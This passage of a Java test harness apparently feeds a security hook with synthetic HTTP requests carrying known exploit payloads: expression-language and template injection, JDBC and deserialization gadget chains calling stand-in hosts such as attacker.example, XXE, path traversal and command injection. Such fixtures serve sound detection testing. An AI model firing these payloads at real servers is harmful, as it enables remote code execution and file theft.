      case "request-h2-console-jdbc-init" -> {
        String jdbc =
            "jdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;"
                + "INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS "
                + "$$//javascript java.lang.Runtime.getRuntime().exec(\"id\") $$;AUTHZPWD=\\";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/h2-console/login.do",
            "driver=org.h2.Driver&url=" + jdbc,
            Map.of("driver", List.of("org.h2.Driver"), "url", List.of(jdbc)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-weblogic-console-shellsession" -> {
        String handle =
            "com.tangosol.coherence.mvel2.sh.ShellSession("
                + "\"java.lang.Runtime.getRuntime().exec('touch /tmp/success1');\")";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/console/css/%252e%252e%252fconsole.portal",
            "_nfpb=true&_pageLabel=&handle=" + handle,
            Map.of("_nfpb", List.of("true"), "_pageLabel", List.of(""), "handle", List.of(handle)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-dataease-h2-datasource-config" -> {
        String jdbc =
            "jdbc:h2:mem:pwn;MODE=MSSQLServer;INIT=CREATE ALIAS EXEC AS $$void exec()"
                + " throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"touch\","
                + "\"/tmp/pwned\"})\\; }$$\\;CALL EXEC()";
        String configuration =
            "{\"jdbc\":\""
                + jdbc.replace("\\", "\\\\").replace("\"", "\\\"")
                + "\",\"username\":\"\",\"password\":\"\",\"driver\":\"org.h2.Driver\"}";
        String encodedConfiguration =
            Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8));
        String body =
            "{\"name\":\"p1\",\"type\":\"h2\",\"configuration\":\""
                + encodedConfiguration
                + "\"}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/de2api/datasource/validate",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-expression-header" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/functionRouter",
              "",
              Map.of(),
              Map.of(
                  "user-agent",
                  "Mozilla/5.0",
                  "spring.cloud.function.routing-expression",
                  "T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/success\")"));
      case "request-expression-content-type" -> {
        String expression =
            "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
                + ".addHeader('vulhub',233*233)}.multipart/form-data";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", expression));
      }
      case "request-jndi-lookup" -> {
        String payload = "${jndi:ldap://${sys:java.version}.example.com}";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/solr/admin/cores",
            "action=" + payload,
            Map.of("action", List.of(payload)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-h2-console-jndi-driver" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/h2-console/login.do",
              "driver=javax.naming.InitialContext&url=ldap%3A%2F%2Fattacker.example%2FExploit",
              Map.of(
                  "driver",
                  List.of("javax.naming.InitialContext"),
                  "url",
                  List.of("ldap://attacker.example/Exploit")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-expression-parameter" -> {
        String parameter = value(request, "parameter", "name");
        String expression =
            value(
                request,
                "value",
                "(#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,"
                    + "#_memberAccess[\"allowStaticMethodAccess\"]=true,"
                    + "@java.lang.Runtime@getRuntime().exec('id'))(meh)");
        String query =
            value(
                request,
                "query",
                ("name".equals(parameter) ? "age=1&" : "") + parameter + "=" + expression);
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            value(request, "uri", "/ajax/example5.action"),
            query,
            "name".equals(parameter)
                ? Map.of("age", List.of("1"), parameter, List.of(expression))
                : Map.of(parameter, List.of(expression)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-geoserver-wfs-valuereference" -> {
        String expression = "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success1')";
        String encodedExpression =
            "exec(java.lang.Runtime.getRuntime()%2C%27touch%20%2Ftmp%2Fsuccess1%27)";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/geoserver/wfs",
            "service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites"
                + "&valueReference="
                + encodedExpression,
            Map.of(
                "service",
                List.of("WFS"),
                "version",
                List.of("2.0.0"),
                "request",
                List.of("GetPropertyValue"),
                "typeNames",
                List.of("sf:archsites"),
                "valueReference",
                List.of(expression)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-geoserver-wfs-valuereference-xml" -> {
        String expression = "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')";
        String body =
            """
            <wfs:GetPropertyValue service="WFS" version="2.0.0"
             xmlns:wfs="http://www.opengis.net/wfs/2.0">
              <wfs:Query typeNames="sf:archsites"/>
              <wfs:valueReference>%s</wfs:valueReference>
            </wfs:GetPropertyValue>
            """
                .formatted(expression);
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/geoserver/wfs",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/xml"),
            body);
      }
      case "request-geoserver-cql-filter-sqli" -> {
        String filter =
            "strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer))"
                + " -- ') = true";
        String encodedFilter =
            "strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version%28%29%29+AS+integer%29%29+--+%27%29+%3D+true";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/geoserver/ows",
            "service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER="
                + encodedFilter,
            Map.of(
                "service",
                List.of("wfs"),
                "version",
                List.of("1.0.0"),
                "request",
                List.of("GetFeature"),
                "typeName",
                List.of("vulhub:example"),
                "CQL_FILTER",
                List.of(filter)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-confluence-delegated-expression" -> {
        String label =
            "\\u0027+#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d"
                + ".internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})+\\u0027";
        String delegated =
            "@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',"
                + "(new freemarker.template.utility.Execute()).exec({\"id\"}))";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/template/aui/text-inline.vm",
            "label=" + label + "&x=" + delegated,
            Map.of("label", List.of(label), "x", List.of(delegated)),
            Map.of(
                "user-agent",
                "Mozilla/5.0",
                "content-type",
                "application/x-www-form-urlencoded"));
      }
      case "request-expression-json-parameter" -> {
        String expression =
            "nxadmin$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6]"
                + ".invoke(null).exec('touch /tmp/success')}";
        String escapedExpression = expression.replace("\\", "\\\\").replace("\"", "\\\"");
        String body =
            "{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"roles\":[\""
                + escapedExpression
                + "\"]}],\"type\":\"rpc\"}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-nexus-go-group-el-expression" -> {
        String expression =
            "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6]"
                + ".invoke(null).exec('touch /tmp/success')}";
        String body =
            "{\"name\":\"internal\",\"online\":true,"
                + "\"storage\":{\"blobStoreName\":\"default\",\"strictContentTypeValidation\":true},"
                + "\"group\":{\"memberNames\":[\""
                + jsonString(expression)
                + "\"]}}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/service/rest/beta/repositories/go/group",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "Mozilla/5.0",
                "content-type",
                "application/json",
                "x-requested-with",
                "XMLHttpRequest",
                "x-nexus-ui",
                "true"),
            body);
      }
      case "request-nexus-extdirect-jexl-expression" -> {
        String expression =
            "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')";
        String body =
            "{\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"page\":1,"
                + "\"start\":0,\"limit\":50,"
                + "\"sort\":[{\"property\":\"name\",\"direction\":\"ASC\"}],"
                + "\"filter\":[{\"property\":\"repositoryName\",\"value\":\"*\"},"
                + "{\"property\":\"expression\",\"value\":\""
                + jsonString(expression)
                + "\"},{\"property\":\"type\",\"value\":\"jexl\"}]}],\"type\":\"rpc\",\"tid\":8}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-oauth-expression-parameter" -> {
        String expression = "${T(java.lang.Runtime).getRuntime().exec('id')}";
        String encodedExpression = "%24%7BT(java.lang.Runtime).getRuntime().exec(%27id%27)%7D";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/oauth/authorize",
            "response_type=" + encodedExpression
                + "&client_id=acme&scope=openid&redirect_uri=http%3A%2F%2Ftest",
            Map.of(
                "response_type",
                List.of(expression),
                "client_id",
                List.of("acme"),
                "scope",
                List.of("openid"),
                "redirect_uri",
                List.of("http://test")),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-json-patch-expression" -> {
        String expression =
            "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{105,100}))"
                + "/lastname";
        String body =
            "[{\"op\":\"replace\",\"path\":\"" + expression + "\",\"value\":\"vulhub\"}]";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "PATCH",
            "/customers/1",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json-patch+json"),
            body);
      }
      case "request-expression-parameter-name" -> {
        String expressionName =
            "username[#this.getClass().forName(\"java.lang.Runtime\")"
                + ".getRuntime().exec(\"touch /tmp/success\")]";
        String encodedName =
            "username%5B%23this.getClass().forName(%22java.lang.Runtime%22)"
                + ".getRuntime().exec(%22touch%20%2Ftmp%2Fsuccess%22)%5D";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/users",
            encodedName + "=&password=&repeatedPassword=",
            Map.of(
                expressionName,
                List.of(""),
                "password",
                List.of(""),
                "repeatedPassword",
                List.of("")),
            Map.of(
                "user-agent",
                "Mozilla/5.0",
                "content-type",
                "application/x-www-form-urlencoded"));
      }
      case "request-spring-binding-expression-name" -> {
        String expressionName = "_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"id\")).start()";
        String encodedName =
            "%5F%28new%20java.lang.ProcessBuilder%28%22bash%22%2C%22-c%22%2C%22id%22%29%29.start%28%29";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/hotels/booking",
            encodedName + "=vulhub",
            Map.of(expressionName, List.of("vulhub")),
            Map.of(
                "user-agent",
                "Mozilla/5.0",
                "content-type",
                "application/x-www-form-urlencoded"));
      }
      case "request-expression-path" -> {
        String encodedPath =
            "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28"
                + "%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29."
                + "%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            value(request, "uri", encodedPath),
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-xxe-payload" -> {
        String xml =
            """
            <?xml version="1.0"?>
            <!DOCTYPE message [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <message>&xxe;</message>
            """;
        String encodedXml =
            "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20message%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cmessage%3E%26xxe%3B%3C%2Fmessage%3E";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/solr/demo/select",
            "wt=xml&defType=xmlparser&q=" + encodedXml,
            Map.of(
                "wt",
                List.of("xml"),
                "defType",
                List.of("xmlparser"),
                "q",
              List.of(xml)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-solr-cve-2017-12629-xxe" -> {
        String xml =
            """
            <?xml version="1.0" ?>
            <!DOCTYPE message [
              <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
              <!ENTITY % file SYSTEM "file:///etc/passwd">
              %local_dtd;
            ]>
            <message>any text</message>
            """;
        String encodedXml =
            "%3C%3Fxml%20version%3D%221.0%22%20%3F%3E%3C!DOCTYPE%20message%20%5B%3C!ENTITY%20%25%20local_dtd%20SYSTEM%20%22file%3A%2F%2F%2Fusr%2Fshare%2Fxml%2Ffontconfig%2Ffonts.dtd%22%3E%3C!ENTITY%20%25%20file%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%25local_dtd%3B%5D%3E%3Cmessage%3Eany%20text%3C%2Fmessage%3E";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/solr/demo/select",
            "wt=xml&defType=xmlparser&q=" + encodedXml,
            Map.of(
                "wt",
                List.of("xml"),
                "defType",
                List.of("xmlparser"),
                "q",
                List.of(xml)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-typed-parameter-deserialization" -> {
        String parameter = "+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource";
        String value =
            "{\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368\"}";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/api/jsonws/invoke",
            "cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D"
                + "&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource="
                + "%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3Aaced00057372003d636f6d2e6d6368%22%7D",
            Map.of(
                "cmd",
                List.of("{\"/expandocolumn/add-column\":{}}"),
                parameter,
                List.of(value)),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "Mozilla/5.0"));
      }
      case "request-typed-payload-deserialization" -> {
        String payload =
            "<wddxPacket version='1.0'><header/><data>"
                + "<struct type='xcom.sun.rowset.JdbcRowSetImplx'>"
                + "<var name='dataSourceName'>"
                + "<string>ldap://attacker.example/Exploit</string>"
                + "</var><var name='autoCommit'><boolean value='true'/></var>"
                + "</struct></data></wddxPacket>";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/CFIDE/adminapi/accessmanager.cfc",
            "method=foo&_cfclient=true&argumentCollection=" + payload,
            Map.of("argumentCollection", List.of(payload)),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "Mozilla/5.0"));
      }
      case "request-hertzbeat-cve-2024-42323-yaml-import" -> {
        String payload =
            """
            !!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\\"touch /tmp/success\\")\\; }$$\\;CALL EXEC ()\\;", [], "a", "b", false ]
            """;
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/api/monitors/import",
            "",
            Map.of(),
            Map.of("content-type", "application/x-yaml", "user-agent", "Mozilla/5.0"),
            payload);
      }
      case "request-xml-polymorphic-gadget" -> {
        String payload =
            """
            <map>
              <entry>
                <jdk.nashorn.internal.objects.NativeString>
                  <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                    <dataHandler>
                      <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                        <is class="javax.crypto.CipherInputStream">
                          <cipher class="javax.crypto.NullCipher">
                            <serviceIterator class="javax.imageio.spi.FilterIterator">
                              <next class="java.lang.ProcessBuilder">
                                <command>
                                  <string>touch</string>
                                  <string>/tmp/success</string>
                                </command>
                              </next>
                            </serviceIterator>
                          </cipher>
                        </is>
                      </dataSource>
                    </dataHandler>
                  </value>
                </jdk.nashorn.internal.objects.NativeString>
              </entry>
            </map>
            """;
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/orders/3/edit",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "Mozilla/5.0"),
            payload);
      }
      case "request-xstream-jndi-xml-gadget" -> {
        String payload =
            """
            <sorted-set>
              <javax.naming.ldap.Rdn_-RdnEntry>
                <type>ysomap</type>
                <value class="com.sun.org.apache.xpath.internal.objects.XRTreeFrag">
                  <m__DTMXRTreeFrag>
                    <m__dtm class="com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM">
                      <m__incrementalSAXSource class="com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces">
                        <fPullParserConfig class="com.sun.rowset.JdbcRowSetImpl" serialization="custom">
                          <javax.sql.rowset.BaseRowSet>
                            <default>
                              <dataSource>ldap://java-chains.example:50389/x</dataSource>
                            </default>
                          </javax.sql.rowset.BaseRowSet>
                        </fPullParserConfig>
                      </m__incrementalSAXSource>
                    </m__dtm>
                  </m__DTMXRTreeFrag>
                </value>
              </javax.naming.ldap.Rdn_-RdnEntry>
            </sorted-set>
            """;
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "Mozilla/5.0"),
            payload);
      }
      case "request-xstream-rmi-xml-gadget" -> {
        String payload =
            """
            <java.util.PriorityQueue serialization="custom">
              <java.util.PriorityQueue>
                <default>
                  <size>2</size>
                </default>
                <javax.naming.ldap.Rdn_-RdnEntry>
                  <value class="com.sun.xml.internal.ws.api.message.Packet" serialization="custom">
                    <message class="com.sun.xml.internal.ws.message.saaj.SAAJMessage">
                      <sm class="com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl">
                        <nullIter class="com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator">
                          <aliases class="com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl">
                            <candidates class="com.sun.jndi.rmi.registry.BindingEnumeration">
                              <ctx>
                                <registry class="sun.rmi.registry.RegistryImpl_Stub" serialization="custom">
                                  <java.rmi.server.RemoteObject>
                                    <string>UnicastRef</string>
                                    <string>evil.example</string>
                                    <int>1099</int>
                                  </java.rmi.server.RemoteObject>
                                </registry>
                                <host>evil.example</host>
                                <port>1099</port>
                              </ctx>
                            </candidates>
                          </aliases>
                        </nullIter>
                      </sm>
                    </message>
                  </value>
                </javax.naming.ldap.Rdn_-RdnEntry>
              </java.util.PriorityQueue>
            </java.util.PriorityQueue>
            """;
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "Mozilla/5.0"),
            payload);
      }
      case "request-template-parameter" -> {
        String template =
            "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) "
                + "#set($ex=$rt.getRuntime().exec('id'))";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/solr/demo/select",
            "q=1&wt=velocity&v.template=custom&v.template.custom=" + template,
            Map.of(
                "q",
                List.of("1"),
                "wt",
                List.of("velocity"),
                "v.template",
                List.of("custom"),
                "v.template.custom",
                List.of(template)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-solr-cve-2019-17558-velocity-template" -> {
        String template =
            "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) "
                + "#set($ex=$rt.getRuntime().exec('id'))";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/solr/demo/select",
            "q=1&wt=velocity&v.template=custom&v.template.custom=" + template,
            Map.of(
                "q",
                List.of("1"),
                "wt",
                List.of("velocity"),
                "v.template",
                List.of("custom"),
                "v.template.custom",
                List.of(template)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-template-loader-enable" -> {
        String body =
            """
            {
              "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
              }
            }
            """;
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "user-agent", "Mozilla/5.0"),
            body);
      }
      case "request-solr-cve-2019-17558-template-loader-enable" -> {
        String body =
            """
            {
              "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
              }
            }
            """;
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "user-agent", "Mozilla/5.0"),
            body);
      }
      case "request-jira-contact-template" -> {
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/secure/ContactAdministrators!default.jspa",
            "subject=" + jiraContactVelocityTemplate() + "&details=v",
            Map.of("subject", List.of(jiraContactVelocityTemplate()), "details", List.of("v")),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "Mozilla/5.0"));
      }
      case "request-template-json-parameter" -> {
        String template =
            "select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
                + " ${ex(\"id\")}'";
        String body = "{\"sql\":\"" + template.replace("\\", "\\\\").replace("\"", "\\\"") + "\"}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/jmreport/queryFieldBySql",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-template-source" -> {
        String body =
            """
            {"contentId":"786458","macro":{"name":"widget","body":"","params":{
              "url":"https://www.viddler.com/v/23464dc6",
              "_template":". /web.xml"
            }}}
            """;
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/rest/tinymce/1/macro/preview",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-coldfusion-metadata-class-source" -> {
        String payload = "{\"_metadata\":{\"classname\":\"../../../../../../../../proc/self/environ\"}}";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc",
            "method=foo&_cfclient=true&_variables=" + payload,
            Map.of("_variables", List.of(payload)),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "Mozilla/5.0"));
      }
      case "request-locale-source-traversal" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/CFIDE/administrator/enter.cfm",
              "locale=../../../../../../../../../../etc/passwd%00en",
              Map.of("locale", List.of("../../../../../../../../../../etc/passwd\u0000en")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-remote-content-stream" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/solr/demo/debug/dump",
              "param=ContentStreams&stream.url=file:///etc/passwd",
              Map.of("param", List.of("ContentStreams"), "stream.url", List.of("file:///etc/passwd")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-solr-remotestreaming-config-enable" -> {
        String body =
            """
            {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
            """;
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "user-agent", "Mozilla/5.0"),
            body);
      }
      case "request-solr-remotestreaming-file-read" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/solr/demo/debug/dump",
              "param=ContentStreams&stream.url=file:///etc/passwd",
              Map.of("param", List.of("ContentStreams"), "stream.url", List.of("file:///etc/passwd")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-remote-import-script-write" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/webtools/control/forgotPassword/viewdatafile",
              "DATAFILE_LOCATION=http://attacker/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://attacker/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce",
              Map.of(
                  "DATAFILE_LOCATION",
                  List.of("http://attacker/rcereport.csv"),
                  "DATAFILE_SAVE",
                  List.of("./applications/accounting/webapp/accounting/index.jsp"),
                  "DATAFILE_IS_URL",
                  List.of("true"),
                  "DEFINITION_LOCATION",
                  List.of("http://attacker/rceschema.xml"),
                  "DEFINITION_IS_URL",
                  List.of("true"),
                  "DEFINITION_NAME",
                  List.of("rce")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-repository-webroot-write" -> {
        String body =
            "{\"type\":\"fs\",\"settings\":{\"location\":\"/usr/local/tomcat/webapps/wwwroot/\","
                + "\"compress\":false}}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "PUT",
            "/_snapshot/yz.jsp",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-plot-command-injection" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/q",
              "start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&yrange=[0:system(%27touch%20/tmp/success%27)]&wxh=1516x644&style=linespoint&grid=t&json",
              Map.of(
                  "start",
                  List.of("2000/10/21-00:00:00"),
                  "m",
                  List.of("sum:sys.cpu.nice"),
                  "yrange",
                  List.of("[0:system('touch /tmp/success')]"),
                  "wxh",
                  List.of("1516x644"),
                  "style",
                  List.of("linespoint"),
                  "grid",
                  List.of("t"),
                  "json",
                  List.of("")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-opentsdb-key-plot-command-injection" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/q",
              "start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&ylabel=1&y2range=[42:42]&key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&wxh=1516x644&style=linespoint&grid=t&json",
              Map.of(
                  "start",
                  List.of("2000/10/21-00:00:00"),
                  "m",
